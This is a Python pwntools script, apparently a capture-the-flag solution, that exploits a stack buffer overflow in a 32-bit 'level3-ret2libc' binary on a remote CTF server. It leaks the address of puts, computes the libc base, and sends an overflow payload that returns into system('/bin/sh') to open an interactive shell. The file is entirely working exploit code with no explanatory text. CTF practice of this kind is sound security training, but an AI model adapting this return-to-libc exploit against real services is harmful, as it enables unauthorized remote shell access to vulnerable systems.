#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
script to solve level3
"""
from pwn import *

r = remote("pwn.sixstars.team","22003")
elf  = ELF("./level3-ret2libc")
libc = ELF("./libc-2.23.so")

sh_addr = list(libc.search("/bin/sh"))[0]
print hex(sh_addr)

exeve_addr =libc.sym["system"]# 0xaf590
print hex(exeve_addr)

s1 = r.recvline()
s2 = r.recvline()
print s2
print "from got: ", hex(elf.got['puts'])
print 'from plt: ', hex(elf.plt['puts'])
print 'form libc: ', hex(libc.sym["puts"])
print 'from elf: ', hex(elf.sym["puts"])
puts_p = libc.sym["puts"]
puts_addr = int(s2[-9:], 16)
print hex(puts_addr)
base_addr = puts_addr - puts_p
print "base_addr is :" + hex(base_addr)

real_exeve = base_addr + exeve_addr
real_sh = base_addr + sh_addr
print "real exev: " + hex(real_exeve)
print "real sh: " + hex(real_sh)

payload = 'a'*0x28 + 'a' * 4
code = p32(real_exeve) +p32(0) + p32(real_sh)# + p32(real_sh)+ p32(0)

r.send(payload + code)
r.interactive()
